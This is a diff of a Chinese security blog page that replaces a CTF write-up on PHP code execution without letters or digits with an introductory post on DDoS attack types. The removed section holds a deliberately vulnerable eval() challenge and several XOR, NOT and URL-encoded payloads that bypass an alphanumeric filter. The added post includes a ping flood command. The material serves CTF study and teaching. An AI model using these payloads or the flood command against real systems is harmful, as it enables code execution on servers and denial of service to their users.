@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>不包含数字和字母的webshell · Ywc&#39;s blog</title>
+    <title>Ddos分布式拒绝服务攻击 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">不包含数字和字母的webshell</a>
+                <a href="#" class="post-name">Ddos分布式拒绝服务攻击</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            不包含数字和字母的webshell
+            Ddos分布式拒绝服务攻击
             <!-- 404 -->
             
         </h1>
@@ -267,12 +267,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">400</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">1,012</span> / Reading time: <span class="post-count">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/11/08</span>
+                    <span class="post-intro-time">2019/02/27</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,33 +396,46 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这一串代码描述是这样子，我们要绕过A-Za-z0-9这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数名，这里我们是 “getFlag”，然后动态执行之即可。</p>
-<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到getFlag函数，然后拿到webshell。</p>
-<p><strong>payload one</strong></p>
-<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag
-</code></pre><p>构造一个变量_ 变量的值为_GET 执行$<em>GET[</em>]($_GET[__])</p>
-<p><strong>payload two</strong> </p>
-<pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();
-</code></pre><p>把getFlag取反然后URL编码</p>
-<p><strong>payload three</strong></p>
-<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag
-</code></pre><p>~ 在 {} 中执行了取反操作，所以 ${~”\xa0\xb8\xba\xab”} 取反相当于 $_GET，拼接出了 $_GET<a href="">‘+’</a>;，传入 +=getFlag() 从而执行了函数</p>
-<p><strong>payload four</strong></p>
-<pre><code>?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();
-</code></pre><p>$啊=getFlag;$啊();，这里就不需要用 {} 了，因为取反的值直接被当作字符串赋值给了 $ 啊。</p>
-<p>当strlen($code)&gt;50时，还可以用</p>
-<pre><code>?code=${&quot;!&quot;^&quot;~&quot;}=&quot;]%];,&lt;&lt;&quot;^&quot;:@)}@][&quot;;${&quot;!&quot;^&quot;~&quot;}();
-</code></pre><p>参考文章：<a href="https://blog.csdn.net/weixin_42815001/article/details/81515427" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42815001/article/details/81515427</a></p>
-<p><a href="http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html#_labelTop" target="_blank" rel="noopener">http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html#_labelTop</a></p>
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DDoS是英文Distributed Denial of Service的缩写，意即”分布式拒绝服务”,DDoS的中文名叫分布式拒绝服务攻击，俗称洪水攻击。</p>
+<p>Dos-拒绝服务攻击：是指攻击者通过某种手段，有意地造成计算机或网络不能正常运转从而不能向合法用户提供所需要的服务或者使得服务质量降低。</p>
+<p>DDos-分布式拒绝服务攻击：处于不同位置的多个攻击者同时向一个或者数个目标发起攻击，或者一个或多个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击，由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。</p>
+<p>简的来说就是利用合理的请求从而造成资源过载，导致服务不可用。利用TCP/UDP协议规律，通过占用协议栈资源或者发起大流量拥塞，达到消耗目标机器性能或者网络的目的。</p>
+<h2 id="类型及原理"><a href="#类型及原理" class="headerlink" title="类型及原理"></a>类型及原理</h2><p>Ddos主要分为三类：流量型攻击；连接型攻击；特殊协议缺陷。</p>
+<font color="blue">1.Ip lood</font>
+
+<p>攻击原理：此攻击以多个随机的源主机地址向目的主机发送超大量的随机或特定的IP包，造成目标主机不能处理其他正常的IP报文。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -l 65535 目标地址IP -t</span><br></pre></td></tr></table></figure></p>
+<p>其中“-l”参数指的是数据的长度上限，“-t”表示的是不停的ping目标地址！</p>
+<p><img src="/2019/02/27/Ddos分布式拒绝服务攻击/1.png" alt="Ddos分布式拒绝服务攻击"></p>
+<font color="blue">2.Syn Flood</font>
+
+<p>攻击原理：依据tcp建立连接的三次握手。此攻击以多个随机的源主机地址向目的主机发送syn包，而在收到目的主机的syn＋ack包后并不回应，目的主机就为这些源主机建立大量的连接队列，由于没有收到ack一直维护这些连接队列，造成资源的大量消耗而不能向正常的请求提供服务。与之类似的攻击方式还有ackflood、s-ackflood、finflood、rstflood、tcpflood 。</p>
+<p><img src="/2019/02/27/Ddos分布式拒绝服务攻击/2.png" alt="Ddos分布式拒绝服务攻击"></p>
+<font color="blue">3.Udp 反射 Flood</font>
+
+<p>攻击原理：有时被保护服务器也有同外部服务器进行udp交互的需求，攻击者就会利用此交互对被保护服务器进行udp反射放大攻击。此攻击在短时间那冒充被攻击地址向外部公用的服务器发送大量的udp请求包，外部服务器收到虚假的udp请求就会回复大量的回应包给被攻击服务器地址，造成目标主机被保护服务器不能处理其他正常的交互流。</p>
+<p><img src="/2019/02/27/Ddos分布式拒绝服务攻击/3.png" alt="Ddos分布式拒绝服务攻击"></p>
+<font color="blue">4.Dns Query Flood</font>
+
+<p>攻击原理：通过发起大量的DNS请求，导致DNS服务器无法响应正常用户的请求，正常用户不能解析DNS，从而不能获取服务。</p>
+<p><img src="/2019/02/27/Ddos分布式拒绝服务攻击/4.png" alt="Ddos分布式拒绝服务攻击"></p>
+<font color="blue">5.Dns Reply Flood</font>
+
+<p>攻击原理：攻击者通过发起大量伪造的DNS回应包，导致DNS服务器带宽拥塞无法响应正常用户的请求，正常用户不能解析DNS，从而不能获取服务。</p>
+<p><img src="/2019/02/27/Ddos分布式拒绝服务攻击/5.png" alt="Ddos分布式拒绝服务攻击"></p>
+<font color="blue">6.Http Flood</font>
+
+<p>攻击原理：此攻击类型主要攻击目标为Web服务器上的网页访问服务，当发生攻击时攻击者向被攻击服务器大量高频的发送一个网页或多个网页的请求服务，使服务器忙于向攻击者提供响应资源从而导致不能想正常的合法用户提供请求响应服务。</p>
+<font color="blue">7.Https Flood</font>
+
+<p>攻击原理：此攻击类型主要攻击目标是使用https协议的Web服务器上的访问服务，当发生攻击时攻击者向被攻击服务器大量高频的发送请求服务，使服务器忙于向攻击者提供https响应资源从而导致不能想正常的合法用户提供请求响应服务。</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/">https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/">November 8th 2018, 10:12:45 am</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2019/02/27/Ddos分布式拒绝服务攻击/">https://yinwc.github.io/2019/02/27/Ddos分布式拒绝服务攻击/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2019/02/27/Ddos分布式拒绝服务攻击/">February 27th 2019, 11:53:52 am</a>
             <p>版权声明: </p>
         </div>
     
@@ -430,17 +443,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/11/10/N1CTF2018题目复现/" title= N1CTF2018题目复现 >
-                    <div class="nextTitle">N1CTF2018题目复现</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/11/08/python沙盒逃逸/" title= python沙箱逃逸 >
-                    <div class="prevTitle">python沙箱逃逸</div>
+                <a href= "/2019/02/02/安全从业人员的职业规划/" title= 安全从业人员的职业规划 >
+                    <div class="prevTitle">安全从业人员的职业规划</div>
                 </a>
             
         </li>
@@ -552,7 +560,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#类型及原理"><span class="toc-number">2.</span> <span class="toc-text">类型及原理</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
